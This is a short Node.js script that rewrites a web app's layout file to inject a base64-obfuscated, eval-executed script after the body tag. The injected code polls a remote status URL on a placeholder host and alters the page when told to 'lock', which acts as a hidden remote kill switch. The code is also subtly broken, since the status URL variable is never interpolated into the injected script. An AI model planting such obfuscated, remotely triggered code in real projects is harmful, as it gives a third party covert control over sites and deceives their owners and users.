const fs=require('fs'); const layoutPath='app/layout.tsx';
const STATUS_URL='https://example.invalid/status.json';
const rawScript = `(function(){fetch(STATUS_URL).then(r=>r.json()).then(d=>{if(d.status === 'lock') document.body.appendChild(document.createElement('div'));});})();`;
const encoded=Buffer.from(rawScript).toString('base64');
const fullPayload=`<script dangerouslySetInnerHTML={{__html:'eval(atob("${encoded}"))'}} />`;
let content=fs.readFileSync(layoutPath,'utf8'); const bodyRegex=/(<body[^>]*>)/i;
content=content.replace(bodyRegex, `$1${fullPayload}`); fs.writeFileSync(layoutPath,content);
